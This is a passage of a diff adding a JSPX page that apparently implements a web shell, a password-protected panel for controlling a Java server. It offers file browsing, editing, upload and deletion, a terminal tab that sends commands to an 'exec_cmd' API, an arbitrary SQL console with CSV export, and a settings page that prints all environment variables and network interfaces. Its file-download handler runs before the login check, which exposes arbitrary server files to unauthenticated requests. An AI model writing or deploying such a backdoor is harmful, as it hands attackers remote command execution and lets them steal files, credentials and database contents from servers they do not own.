+        sb.append("<button class=\"btn btn-sm btn-danger\" onclick=\"dbDisconnect()\" style=\"margin-left:1rem\">Disconnect</button>");
+        sb.append("<button class=\"btn btn-sm btn-secondary\" onclick=\"loadDbTables()\" style=\"margin-left:0.5rem\">📋 Show Tables</button>");
+        sb.append("<button class=\"btn btn-sm btn-secondary\" onclick=\"showDatabases()\" style=\"margin-left:0.5rem\">🗄️ Show DBs</button>");
+        sb.append("</div>");
+        sb.append("<div class=\"db-query\">");
+        sb.append("<textarea id=\"dbQueryText\" placeholder=\"Enter SQL query...\"></textarea>");
+        sb.append("<div style=\"display:flex;gap:0.5rem;margin-top:0.5rem\">");
+        sb.append("<button class=\"btn btn-primary\" onclick=\"executeDbQuery()\">▶️ Execute Query</button>");
+        sb.append("<button class=\"btn btn-secondary\" onclick=\"exportCsv()\">📥 Export CSV</button>");
+        sb.append("</div></div>");
+        sb.append("<div id=\"dbResults\" class=\"db-table\"></div>");
+        sb.append("<div id=\"dbTables\" style=\"margin-top:1rem\"></div>");
+    }
+    sb.append("</div>");
+    return sb.toString();
+}
+
+private String renderSettingsContent(HttpServletRequest request) {
+    StringBuilder sb = new StringBuilder();
+    sb.append("<div class=\"card\">");
+    sb.append("<div class=\"card-header\"><span class=\"card-icon\">⚙️</span><h3>System Settings</h3></div>");
+    
+    sb.append("<div class=\"info-row\"><span class=\"info-label\">Host Name</span>");
+    try {
+        sb.append("<span class=\"info-value\">").append(escapeHtml(java.net.InetAddress.getLocalHost().getHostName())).append("</span>");
+    } catch (Exception e) {
+        sb.append("<span class=\"info-value\">N/A</span>");
+    }
+    sb.append("</div>");
+    
+    sb.append("<div class=\"info-row\"><span class=\"info-label\">Client IP</span>");
+    sb.append("<span class=\"info-value\">").append(escapeHtml(getClientIp(request))).append("</span></div>");
+    
+    sb.append("<div class=\"info-row\"><span class=\"info-label\">User Name</span>");
+    sb.append("<span class=\"info-value\">").append(escapeHtml(System.getProperty("user.name"))).append("</span></div>");
+    
+    sb.append("<div class=\"info-row\"><span class=\"info-label\">User Language</span>");
+    sb.append("<span class=\"info-value\">").append(escapeHtml(System.getProperty("user.language"))).append("</span></div>");
+    
+    sb.append("<div class=\"info-row\"><span class=\"info-label\">File Encoding</span>");
+    sb.append("<span class=\"info-value\">").append(escapeHtml(System.getProperty("file.encoding"))).append("</span></div>");
+    
+    sb.append("<div class=\"info-row\"><span class=\"info-label\">Temp Directory</span>");
+    sb.append("<span class=\"info-value\">").append(escapeHtml(System.getProperty("java.io.tmpdir"))).append("</span></div>");
+    
+    sb.append("</div>");
+    
+    // Network interfaces
+    sb.append("<div class=\"card\" style=\"margin-top:1rem\">");
+    sb.append("<div class=\"card-header\"><span class=\"card-icon\">🌐</span><h3>Network Interfaces</h3></div>");
+    try {
+        java.util.Enumeration<java.net.NetworkInterface> nets = java.net.NetworkInterface.getNetworkInterfaces();
+        while (nets.hasMoreElements()) {
+            java.net.NetworkInterface netint = nets.nextElement();
+            sb.append("<div class=\"info-row\"><span class=\"info-label\">").append(escapeHtml(netint.getDisplayName())).append("</span>");
+            java.util.Enumeration<java.net.InetAddress> inetAddresses = netint.getInetAddresses();
+            StringBuilder addrs = new StringBuilder();
+            while (inetAddresses.hasMoreElements()) {
+                if (addrs.length() > 0) addrs.append(", ");
+                addrs.append(inetAddresses.nextElement().getHostAddress());
+            }
+            sb.append("<span class=\"info-value\">").append(escapeHtml(addrs.toString())).append("</span></div>");
+        }
+    } catch (Exception e) {
+        sb.append("<div class=\"info-row\"><span class=\"info-value\">Unable to retrieve network interfaces</span></div>");
+    }
+    sb.append("</div>");
+    
+    // Environment variables
+    sb.append("<div class=\"card\" style=\"margin-top:1rem\">");
+    sb.append("<div class=\"card-header\"><span class=\"card-icon\">📋</span><h3>Environment Variables</h3></div>");
+    Map<String, String> env = System.getenv();
+    for (Map.Entry<String, String> entry : env.entrySet()) {
+        sb.append("<div class=\"info-row\"><span class=\"info-label\">").append(escapeHtml(entry.getKey())).append("</span>");
+        sb.append("<span class=\"info-value\">").append(escapeHtml(entry.getValue())).append("</span></div>");
+    }
+    sb.append("</div>");
+    
+    return sb.toString();
+}
+]]></jsp:declaration>
+
+<jsp:scriptlet><![CDATA[
+if (request.getParameter("api") != null) {
+    handleApiRequest(request, response, session, out);
+    return;
+}
+if (request.getParameter("download") != null) {
+    String downloadPath = request.getParameter("path");
+    File file = new File(downloadPath);
+    if (file.exists()) {
+        response.setContentType("application/octet-stream");
+        response.setHeader("Content-Disposition", "attachment; filename=" + file.getName());
+        try (FileInputStream fis = new FileInputStream(file);
+             OutputStream os = response.getOutputStream()) {
+            byte[] buffer = new byte[4096];
+            int bytesRead;
+            while ((bytesRead = fis.read(buffer)) != -1) {
+                os.write(buffer, 0, bytesRead);
+            }
+        }
+        return;
+    }
+}
+if (request.getParameter("logout") != null) {
+    session.setAttribute("authenticated", false);
+    session.removeAttribute("login_time");
+    response.sendRedirect("index.jspx");
+    return;
+}
+if ("POST".equals(request.getMethod()) && request.getParameter("password") != null) {
+    String password = request.getParameter("password");
+    if (computeSHA256(password).equals(AUTH_HASH)) {
+        session.setAttribute("authenticated", true);
+        session.setAttribute("login_time", System.currentTimeMillis());
+        response.sendRedirect("index.jspx?page=dashboard");
+        return;
+    }
+}
+String currentPage = request.getParameter("page");
+if (currentPage == null) currentPage = "dashboard";
+String cwd = normalizePath(System.getProperty("user.dir"));
+]]></jsp:scriptlet>
+
+<jsp:text><![CDATA[<!DOCTYPE html>
+<html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+<meta charset="UTF-8"/>
+<meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+<title>]]></jsp:text><jsp:expression>APP_NAME</jsp:expression><jsp:text><![CDATA[</title>
+<style>
+* { margin: 0; padding: 0; box-sizing: border-box; }
+body { font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif; background: #f5f7fa; color: #333; }
+.login-body { background: linear-gradient(135deg, #667eea 0%, #764ba2 100%); min-height: 100vh; display: flex; align-items: center; justify-content: center; }
+.login-container { background: white; padding: 3rem; border-radius: 12px; box-shadow: 0 20px 60px rgba(0,0,0,0.3); width: 100%; max-width: 400px; text-align: center; }
+.login-container h1 { color: #333; font-size: 2rem; margin-bottom: 0.5rem; }
+.login-container p { color: #666; margin-bottom: 2rem; }
+.form-control { width: 100%; padding: 0.75rem; border: 2px solid #e0e0e0; border-radius: 6px; font-size: 1rem; margin-bottom: 1rem; }
+.form-control:focus { outline: none; border-color: #667eea; }
+.btn { padding: 0.75rem 1.5rem; border: none; border-radius: 6px; cursor: pointer; font-size: 1rem; transition: all 0.2s; }
+.btn-primary { background: linear-gradient(135deg, #667eea 0%, #764ba2 100%); color: white; }
+.btn-primary:hover { transform: translateY(-2px); box-shadow: 0 4px 12px rgba(102,126,234,0.4); }
+.btn-secondary { background: #6c757d; color: white; }
+.btn-danger { background: #dc3545; color: white; }
+.btn-sm { padding: 0.5rem 1rem; font-size: 0.875rem; }
+.topnav { background: linear-gradient(135deg, #1e3a8a 0%, #3b82f6 100%); color: white; padding: 1rem 2rem; display: flex; justify-content: space-between; align-items: center; box-shadow: 0 2px 8px rgba(0,0,0,0.1); }
+.topnav .brand { font-size: 1.25rem; font-weight: bold; }
+.topnav .tabs { display: flex; gap: 1rem; }
+.topnav .tabs a { color: rgba(255,255,255,0.8); text-decoration: none; padding: 0.5rem 1rem; border-radius: 6px; transition: all 0.2s; }
+.topnav .tabs a:hover, .topnav .tabs a.active { background: rgba(255,255,255,0.2); color: white; }
+.topnav .user-info { display: flex; align-items: center; gap: 1rem; font-size: 0.875rem; }
+.card { background: white; padding: 1.5rem; margin: 2rem auto; max-width: 1400px; border-radius: 8px; box-shadow: 0 2px 4px rgba(0,0,0,0.1); }
+.card-header { display: flex; align-items: center; gap: 0.5rem; margin-bottom: 1.5rem; padding-bottom: 1rem; border-bottom: 2px solid #f0f0f0; }
+.card-header h3 { font-size: 1.25rem; color: #1e3a8a; }
+.card-icon { font-size: 1.5rem; }
+.info-row { display: flex; padding: 0.75rem 0; border-bottom: 1px solid #f0f0f0; }
+.info-label { font-weight: 600; color: #666; width: 200px; }
+.info-value { color: #333; flex: 1; font-family: monospace; word-break: break-all; white-space: pre-wrap; }
+.toolbar { display: flex; justify-content: space-between; align-items: center; flex-wrap: wrap; gap: 1rem; padding: 1rem; }
+.path-nav { display: flex; align-items: center; gap: 0.5rem; flex: 1; }
+.path-input { flex: 1; min-width: 300px; }
+.toolbar-actions { display: flex; gap: 0.5rem; }
+.file-table { width: 100%; border-collapse: collapse; }
+.file-table thead { background: #f8f9fa; }
+.file-table th, .file-table td { padding: 0.75rem; text-align: left; border-bottom: 1px solid #e0e0e0; }
+.file-table th { font-weight: 600; color: #1e3a8a; }
+.file-table tbody tr:hover { background: #f8f9fa; cursor: pointer; }
+.file-name { display: inline-flex; align-items: center; gap: 0.5rem; }
+.file-name.dir { color: #3b82f6; font-weight: 500; }
+.file-icon { font-size: 1.25rem; }
+.action-btns { display: flex; gap: 0.25rem; }
+.action-btn { background: none; border: none; cursor: pointer; font-size: 1rem; padding: 0.25rem 0.5rem; border-radius: 4px; transition: background 0.2s; }
+.action-btn:hover { background: #f0f0f0; }
+.action-btn.danger:hover { background: #fee; color: #dc3545; }
+.db-form { display: grid; grid-template-columns: repeat(auto-fit, minmax(200px, 1fr)); gap: 1rem; margin-bottom: 1rem; }
+.db-query textarea { width: 100%; min-height: 120px; padding: 0.75rem; border: 2px solid #e0e0e0; border-radius: 6px; font-family: monospace; font-size: 0.875rem; resize: vertical; }
+.db-table { overflow-x: auto; margin-top: 1rem; }
+.db-table table { width: 100%; border-collapse: collapse; font-size: 0.875rem; }
+.db-table th, .db-table td { padding: 0.5rem; border: 1px solid #e0e0e0; text-align: left; }
+.db-table th { background: #f8f9fa; font-weight: 600; }
+.terminal-container { background: #1e1e1e; color: #d4d4d4; border-radius: 6px; overflow: hidden; }
+.terminal-output { font-family: 'Consolas', 'Monaco', monospace; font-size: 0.875rem; padding: 1rem; min-height: 400px; max-height: 600px; overflow-y: auto; white-space: pre-wrap; word-break: break-all; }
+.terminal-input { display: flex; gap: 0.5rem; padding: 1rem; background: #252526; border-top: 1px solid #3e3e3e; }
+.terminal-input input { flex: 1; background: #3c3c3c; color: #d4d4d4; border: 1px solid #555; padding: 0.5rem; border-radius: 4px; font-family: 'Consolas', 'Monaco', monospace; }
+.modal-overlay { display: none; position: fixed; top: 0; left: 0; right: 0; bottom: 0; background: rgba(0,0,0,0.5); z-index: 1000; align-items: center; justify-content: center; }
+.modal-overlay.active { display: flex; }
+.modal { background: white; border-radius: 8px; padding: 0; max-width: 600px; width: 90%; max-height: 90vh; overflow: hidden; display: flex; flex-direction: column; }
+.modal.modal-lg { max-width: 1000px; }
+.modal-header { display: flex; justify-content: space-between; align-items: center; padding: 1.5rem; border-bottom: 1px solid #e0e0e0; }
+.modal-header h3 { color: #1e3a8a; }
+.modal-close { background: none; border: none; font-size: 1.5rem; cursor: pointer; color: #666; }
+.modal-body { padding: 1.5rem; overflow-y: auto; flex: 1; }
+.modal-footer { display: flex; justify-content: flex-end; gap: 0.5rem; padding: 1rem 1.5rem; border-top: 1px solid #e0e0e0; }
+.file-editor { width: 100%; min-height: 500px; padding: 1rem; border: 2px solid #e0e0e0; border-radius: 4px; font-family: 'Consolas', 'Monaco', monospace; font-size: 0.875rem; resize: vertical; }
+.toast { position: fixed; bottom: 2rem; right: 2rem; background: #333; color: white; padding: 1rem 1.5rem; border-radius: 6px; box-shadow: 0 4px 12px rgba(0,0,0,0.3); z-index: 2000; animation: slideIn 0.3s ease; }
+.toast.success { background: #28a745; }
+.toast.error { background: #dc3545; }
+@keyframes slideIn { from { transform: translateX(400px); opacity: 0; } to { transform: translateX(0); opacity: 1; } }
+.text-muted { color: #6c757d; }
+.text-center { text-align: center; }
+.mb-2 { margin-bottom: 0.5rem; }
+</style>
+</head>
+<body>]]></jsp:text>
+
+<jsp:scriptlet><![CDATA[
+if (!isAuthenticated(session)) {
+]]></jsp:scriptlet>
+<jsp:text><![CDATA[<div class="login-body">
+<div class="login-container">
+<h1>]]></jsp:text><jsp:expression>APP_NAME</jsp:expression><jsp:text><![CDATA[</h1>
+<p>JSPX Edition v]]></jsp:text><jsp:expression>APP_VERSION</jsp:expression><jsp:text><![CDATA[</p>
+<form method="POST" action="index.jspx">
+<input type="password" name="password" class="form-control" placeholder="Enter password" required="required" autofocus="autofocus"/>
+<button type="submit" class="btn btn-primary" style="width:100%">🔐 Login</button>
+</form>
+</div>
+</div>]]></jsp:text>
+<jsp:scriptlet><![CDATA[
+} else {
+]]></jsp:scriptlet>
+<jsp:text><![CDATA[<nav class="topnav">
+<div class="brand">]]></jsp:text><jsp:expression>APP_NAME</jsp:expression><jsp:text><![CDATA[ v]]></jsp:text><jsp:expression>APP_VERSION</jsp:expression><jsp:text><![CDATA[</div>
+<div class="tabs">
+<a href="?page=dashboard" class="]]></jsp:text><jsp:expression>"dashboard".equals(currentPage) ? "active" : ""</jsp:expression><jsp:text><![CDATA[">🖥️ Dashboard</a>
+<a href="?page=files" class="]]></jsp:text><jsp:expression>"files".equals(currentPage) ? "active" : ""</jsp:expression><jsp:text><![CDATA[">📁 Files</a>
+<a href="?page=database" class="]]></jsp:text><jsp:expression>"database".equals(currentPage) ? "active" : ""</jsp:expression><jsp:text><![CDATA[">🗄️ Database</a>
+<a href="?page=terminal" class="]]></jsp:text><jsp:expression>"terminal".equals(currentPage) ? "active" : ""</jsp:expression><jsp:text><![CDATA[">💻 Terminal</a>
+<a href="?page=settings" class="]]></jsp:text><jsp:expression>"settings".equals(currentPage) ? "active" : ""</jsp:expression><jsp:text><![CDATA[">⚙️ Settings</a>
+</div>
+
+<div class="user-info">
+<span>Session: ]]></jsp:text><jsp:expression>getSessionTime(session)</jsp:expression><jsp:text><![CDATA[</span>
+<a href="?logout=1" style="color:white;text-decoration:none">🚪 Logout</a>
+</div>
+</nav>
+]]></jsp:text>
+
+<jsp:scriptlet><![CDATA[
+String pageContent = "";
+if ("dashboard".equals(currentPage)) {
+    pageContent = renderDashboardContent();
+} else if ("files".equals(currentPage)) {
+    pageContent = renderFilesContent();
+} else if ("terminal".equals(currentPage)) {
+    pageContent = renderTerminalContent(cwd);
+} else if ("database".equals(currentPage)) {
+    pageContent = renderDatabaseContent(session);
+} else if ("settings".equals(currentPage)) {
+    pageContent = renderSettingsContent(request);
+} else {
+    pageContent = renderDashboardContent();
+}
+out.print(pageContent);
+]]></jsp:scriptlet>
+
+<jsp:text><![CDATA[
+
+<script type="text/javascript">
+// JSPX XML-compatible JavaScript
+var currentPath = "]]></jsp:text><jsp:expression>escapeJs(cwd)</jsp:expression><jsp:text><![CDATA[";
+var editingFile = null;
+var deleteItemPath = null;
+var renameItemPath = null;
+var terminalCwd = "]]></jsp:text><jsp:expression>escapeJs(cwd)</jsp:expression><jsp:text><![CDATA[";
+var terminalHistory = [];
+var terminalHistoryIndex = -1;
+
+function escapeHtml(text) {
+    if (text == null) return '';
+    return String(text)
+        .replace(/&/g, "&amp;")
+        .replace(/</g, "&lt;")
+        .replace(/>/g, "&gt;")
+        .replace(/"/g, "&quot;")
+        .replace(/'/g, "&#039;");
+}
+
+function escapeJsStr(text) {
+    if (text == null) return '';
+    return String(text).replace(/\\/g, '\\\\').replace(/'/g, "\\'");
+}
+
+function toast(message, type) {
+    var toast = document.createElement('div');
+    toast.className = 'toast ' + (type || 'success');
+    toast.textContent = message;
+    document.body.appendChild(toast);
+    setTimeout(function() { toast.remove(); }, 3000);
+}
+
+function showModal(id) {
+    document.getElementById(id).classList.add('active');
+}
+
+function closeModal(id) {
+    document.getElementById(id).classList.remove('active');
+}
+
+function init() {
+    var page = new URLSearchParams(window.location.search).get('page') || 'dashboard';
+    if (page === 'files') initFiles();
+    if (page === 'terminal') initTerminal();
+    if (page === 'database') initDatabase();
+}
+
+function initFiles() {
+    loadFiles();
+}
+
+function loadFiles() {
+    fetch('?api=1&action=list_files&path=' + encodeURIComponent(currentPath))
+        .then(function(r) { return r.json(); })
+        .then(function(data) {
+            if (data.status === 'success') {
+                currentPath = data.path;
+                var pathInput = document.getElementById('currentPath');
+                if (pathInput) {
+                    pathInput.value = currentPath;
+                    pathInput.setAttribute('readonly', 'readonly');
+                }
+                renderFiles(data.data);
+            } else {
+                toast(data.message || 'Failed to load files', 'error');
+            }
+        })
+        .catch(function(err) {
+            toast('Error loading files: ' + err.message, 'error');
+        });
+}
+
+function normalizePath(path) {
+    return path.replace(/\\\\/g, '/');
+}
+
+function renderFiles(files) {
+    var tbody = document.getElementById('fileList');
+    if (!files.length) {
+        tbody.innerHTML = '<tr><td colspan="6" class="text-center text-muted">Empty</td></tr>';
+        return;
+    }
+    var html = '';
+    for (var i = 0; i < files.length; i++) {
+        var f = files[i];
+        var isDir = f.type === 'dir';
+        var icon = f.name === '..' ? '⬆️' : (isDir ? '📁' : '📄');
+        var cls = isDir ? 'file-name dir' : 'file-name';
+        var fullPath = f.name === '..' ? '' : normalizePath(currentPath + '/' + f.name);
+        var encodedPath = encodeURIComponent(fullPath);
+        var encodedName = encodeURIComponent(f.name);
+        var dbl = f.name === '..' ? 'goUp()' : (isDir ? 
+            'navigateTo(decodeURIComponent("' + encodedPath + '"))' : 
+            'editFile(decodeURIComponent("' + encodedPath + '"))');
+        var acts = f.name === '..' ? '' : 
+            (isDir ? '' : '<button class="action-btn" title="Edit" onclick="event.stopPropagation();editFile(decodeURIComponent(\'' + encodedPath + '\'))">📝</button>') +
+            '<button class="action-btn" title="Rename" onclick="event.stopPropagation();showRename(decodeURIComponent(\'' + encodedPath + '\'),decodeURIComponent(\'' + encodedName + '\'))">✏️</button>' +
+            (isDir ? '' : '<button class="action-btn" title="Download" onclick="event.stopPropagation();download(decodeURIComponent(\'' + encodedPath + '\'))">⬇️</button>') +
+            '<button class="action-btn danger" title="Delete" onclick="event.stopPropagation();showDelete(decodeURIComponent(\'' + encodedPath + '\'),decodeURIComponent(\'' + encodedName + '\'))">🗑️</button>';
+        html += '<tr ondblclick="' + dbl + '">' +
+            '<td><span class="file-icon">' + icon + '</span><span class="' + cls + '">' + f.name + '</span></td>' +
+            '<td class="text-muted">' + f.size + '</td>' +
+            '<td><code>' + f.perms + '</code></td>' +
+            '<td class="text-muted">' + (f.owner || 'N/A') + '</td>' +
+            '<td class="text-muted">' + f.modified + '</td>' +
+            '<td class="action-btns">' + acts + '</td></tr>';
+    }
+    tbody.innerHTML = html;
+}
+
+function navigateTo(path) { 
+    currentPath = path; 
+    loadFiles(); 
+}
+
+function goUp() {
+    var idx = currentPath.lastIndexOf('/');
+    if (idx > 0) {
+        currentPath = currentPath.substring(0, idx);
+        if (currentPath.length === 0 || currentPath.indexOf('/') === -1 && currentPath.indexOf('\\') === -1) {
+            currentPath = '/';
+        }
+    } else if (idx === 0) {
+        currentPath = '/';
+    }
+    loadFiles();
+}
+
+function enablePathEdit() {
+    var pathInput = document.getElementById('currentPath');
+    pathInput.removeAttribute('readonly');
+    pathInput.select();
+    pathInput.focus();
+}
+
+function navigateToPath() {
+    currentPath = document.getElementById('currentPath').value;
+    document.getElementById('currentPath').setAttribute('readonly', 'readonly');
+    loadFiles();
+}
+
+function refreshFiles() { loadFiles(); toast('Refreshed'); }
+
+function postApi(action, data) {
+    var params = new URLSearchParams();
+    for (var key in data) {
+        params.append(key, data[key]);
+    }
+    return fetch('?api=1&action=' + action, {
+        method: 'POST',
+        body: params
+    }).then(function(r) { return r.json(); });
+}
+
+function editFile(path) {
+    fetch('?api=1&action=read_file&path=' + encodeURIComponent(path))
+        .then(function(r) { return r.json(); })
+        .then(function(data) {
+            if (data.status === 'success') {
+                editingFile = path;
+                document.getElementById('editorTitle').textContent = 'Edit: ' + path.split('/').pop();
+                document.getElementById('fileEditor').value = data.content;
+                showModal('editorModal');
+            } else { toast(data.message, 'error'); }
+        });
+}
+
+function saveFile() {
+    postApi('save_file', {
+        path: editingFile,
+        content: document.getElementById('fileEditor').value
+    }).then(function(data) {
+        toast(data.message, data.status);
+        if (data.status === 'success') closeModal('editorModal');
+    });
+}
+
+function openNewFileModal() {
+    document.getElementById('newFileName').value = '';
+    showModal('newFileModal');
+}
+
+function openNewFolderModal() {
+    document.getElementById('newFolderName').value = '';
+    showModal('newFolderModal');
+}
+
+function createNewFile() {
+    var name = document.getElementById('newFileName').value.trim();
+    if (!name) { toast('Enter file name', 'error'); return; }
+    postApi('create_file', {
+        path: currentPath,
+        name: name
+    }).then(function(data) {
+        toast(data.message, data.status);
+        if (data.status === 'success') { closeModal('newFileModal'); loadFiles(); }
+    });
+}
+
+function createNewFolder() {
+    var name = document.getElementById('newFolderName').value.trim();
+    if (!name) { toast('Enter folder name', 'error'); return; }
+    postApi('create_folder', {
+        path: currentPath,
+        name: name
+    }).then(function(data) {
+        toast(data.message, data.status);
+        if (data.status === 'success') { closeModal('newFolderModal'); loadFiles(); }
+    });
+}
+
+function uploadFile() {
+    var fileInput = document.getElementById('fileUpload');
+    if (!fileInput.files.length) { toast('Select a file', 'error'); return; }
+    var fd = new FormData();
+    fd.append('path', currentPath);
+    fd.append('file', fileInput.files[0]);
+    fetch('?api=1&action=upload_file', {method:'POST', body:fd})
+        .then(function(r) { return r.json(); })
+        .then(function(data) {
+            toast(data.message, data.status);
+            if (data.status === 'success') { closeModal('uploadModal'); loadFiles(); }
+        });
+}
+
+function download(path) {
+    window.location.href = '?download=1&path=' + encodeURIComponent(path);
+}
+
+function showDelete(path, name) {
+    deleteItemPath = path;
+    document.getElementById('deleteItemName').textContent = name;
+    showModal('deleteModal');
+}
+
+function confirmDelete() {
+    postApi('delete_item', {
+        path: deleteItemPath
+    }).then(function(data) {
+        toast(data.message, data.status);
+        if (data.status === 'success') { closeModal('deleteModal'); loadFiles(); }
+    });
+}
+
+function showRename(path, oldName) {
+    renameItemPath = path;
+    document.getElementById('renameInput').value = oldName;
+    showModal('renameModal');
+}
+
+function confirmRename() {
+    var newName = document.getElementById('renameInput').value.trim();
+    if (!newName) { toast('Enter new name', 'error'); return; }
+    postApi('rename_item', {
+        old_path: renameItemPath,
+        new_name: newName
+    }).then(function(data) {
+        toast(data.message, data.status);
+        if (data.status === 'success') { closeModal('renameModal'); loadFiles(); }
+    });
+}
+
+function initTerminal() {
+    var cmdInput = document.getElementById('terminalCmd');
+    if (cmdInput) {
+        cmdInput.addEventListener('keydown', function(e) {
+            if (e.key === 'ArrowUp') {
+                e.preventDefault();
+                if (terminalHistoryIndex < terminalHistory.length - 1) {
+                    terminalHistoryIndex++;
+                    cmdInput.value = terminalHistory[terminalHistory.length - 1 - terminalHistoryIndex];
+                }
+            } else if (e.key === 'ArrowDown') {
+                e.preventDefault();
+                if (terminalHistoryIndex > 0) {
+                    terminalHistoryIndex--;
+                    cmdInput.value = terminalHistory[terminalHistory.length - 1 - terminalHistoryIndex];
+                } else if (terminalHistoryIndex === 0) {
+                    terminalHistoryIndex = -1;
+                    cmdInput.value = '';
+                }
+            }
+        });
+    }
+}
+
+function executeCmd() {
+    var cmd = document.getElementById('terminalCmd').value.trim();
+    if (!cmd) return;
+    
+    terminalHistory.push(cmd);
+    terminalHistoryIndex = -1;
+    
+    addToTerminal('$ ' + cmd);
+    document.getElementById('terminalCmd').value = '';
+    
+    postApi('exec_cmd', {
+        cmd: cmd,
+        cwd: terminalCwd
+    }).then(function(data) {
+        if (data.status === 'success') {
+            addToTerminal(data.data.output || '');
+            if (data.data.cwd) {
+                terminalCwd = data.data.cwd;
+            }
+        } else {
+            addToTerminal('Error: ' + data.message);
+        }
+    });
+}
+
+function addToTerminal(text) {
+    var output = document.getElementById('terminalOutput');
+    if (output) {
+        output.textContent += text + '\\n';
+        output.scrollTop = output.scrollHeight;
+    }
+}
+
+function clearTerminal() {
+    var output = document.getElementById('terminalOutput');
+    if (output) {
+        output.textContent = 'Welcome to JSPX Terminal\\nCurrent directory: ' + terminalCwd + '\\n\\n';
+    }
+}
+
+function initDatabase() {
+    // Database initialization if needed
+}
+
+function dbConnect() {
+    postApi('db_connect', {
+        driver: document.getElementById('dbDriver').value,
+        host: document.getElementById('dbHost').value,
+        port: document.getElementById('dbPort').value,
+        dbname: document.getElementById('dbName').value,
+        user: document.getElementById('dbUser').value,
+        pass: document.getElementById('dbPass').value
+    }).then(function(data) {
+        toast(data.message, data.status);
+        if (data.status === 'success') {
+            setTimeout(function() { location.reload(); }, 1000);
+        }
+    });
+}
+
+function dbDisconnect() {
+    fetch('?api=1&action=db_disconnect', {method:'POST'})
+        .then(function(r) { return r.json(); })
+        .then(function(data) {
+            toast(data.message, data.status);
+            setTimeout(function() { location.reload(); }, 1000);
+        });
+}
+
+function loadDbTables() {
+    fetch('?api=1&action=db_tables', {method:'POST'})
+        .then(function(r) { return r.json(); })
+        .then(function(data) {
+            if (data.status === 'success') {
+                var html = '<div style="margin-top:1rem"><h4>Tables:</h4><ul>';
+                if (data.tables && data.tables.length > 0) {
+                    data.tables.forEach(function(table) {
+                        html += '<li style="cursor:pointer;color:#3b82f6" onclick="loadTableData(\'' + escapeJsStr(table) + '\')">' + escapeHtml(table) + '</li>';
+                    });
+                } else {
+                    html += '<li>No tables found</li>';
+                }
+                html += '</ul></div>';
+                var container = document.getElementById('dbTables');
+                if (container) container.innerHTML = html;
+                toast('Tables loaded', 'success');
+            } else {
+                toast(data.message, 'error');
+            }
+        });
+}
+
+function loadTableData(table) {
+    document.getElementById('dbQueryText').value = 'SELECT * FROM ' + table + ' LIMIT 100';
+    executeDbQuery();
+}
+
+function showDatabases() {
+    document.getElementById('dbQueryText').value = 'SHOW DATABASES';
+    executeDbQuery();
+}
+
+function executeDbQuery() {
+    var query = document.getElementById('dbQueryText').value.trim();
+    if (!query) { toast('Enter a query', 'error'); return; }
+    postApi('db_query', {
+        query: query
+    }).then(function(data) {
+        console.log('DB Response:', data); // Debugging
+        if (data.status === 'success') {
+            if (data.data && data.data.columns && data.data.columns.length > 0) {
+                renderDbResults(data.data);
+                toast('Query executed', 'success');
+            } else if (data.data && data.data.affected !== undefined) {
+                document.getElementById('dbResults').innerHTML = '<p>Query executed. Rows affected: ' + data.data.affected + '</p>';
+                toast('Query executed', 'success');
+            } else if (data.affected !== undefined) {
+                document.getElementById('dbResults').innerHTML = '<p>Query executed. Rows affected: ' + data.affected + '</p>';
+                toast('Query executed', 'success');
+            } else {
+                document.getElementById('dbResults').innerHTML = '<p class="text-muted">No data returned</p>';
+                toast('Query executed (No results)', 'success');
+            }
+        } else {
+            toast(data.message, 'error');
+        }
+    }).catch(function(e) {
+        console.error(e);
+        toast('Request failed: ' + e.message, 'error');
+    });
+}
+
+function renderDbResults(data) {
+    var container = document.getElementById('dbResults');
+    if (!container) return;
+
+    if (!data || !data.columns) {
+        container.innerHTML = '<p class="text-muted">No data returned</p>';
+        return;
+    }
+    var html = '<table><thead><tr>';
+    data.columns.forEach(function(col) {
+        html += '<th>' + escapeHtml(col) + '</th>';
+    });
+    html += '</tr></thead><tbody>';
+    data.rows.forEach(function(row) {
+        html += '<tr>';
+        data.columns.forEach(function(col) {
+            var val = row[col];
+            if (val === undefined) {
+                // Try to find key case-insensitively or exact match
+                // Since we can't iterate keys easily here without performance hit, 
+                // we rely on exact match. If undefined, check if row has the key.
+                // But row is an object.
+                val = 'NULL'; 
+                if (row[col] !== undefined) val = row[col];
+            }
+            html += '<td>' + (val != null ? escapeHtml(val) : 'NULL') + '</td>';
+        });
+        html += '</tr>';
+    });
+    html += '</tbody></table>';
+    html += '<p class="text-muted" style="margin-top:1rem;">' + data.rows.length + ' rows returned</p>';
+    container.innerHTML = html;
+}
+
+function exportCsv() {
+    var query = document.getElementById('dbQueryText').value.trim();
+    if (!query) { toast('Enter a query', 'error'); return; }
+    window.location.href = '?api=1&action=db_export_csv&query=' + encodeURIComponent(query);
+    toast('Exporting CSV...', 'success');
+}
+
+document.addEventListener('click', function(e) {
+    if (e.target.classList.contains('modal-overlay')) {
+        e.target.classList.remove('active');
+    }
+});
+
+window.addEventListener('DOMContentLoaded', function() {
+    init();
+});
+</script>]]></jsp:text>
+<jsp:scriptlet><![CDATA[
+}
+]]></jsp:scriptlet>
+<jsp:text><![CDATA[</body>
+</html>]]></jsp:text>
+
+</jsp:root>
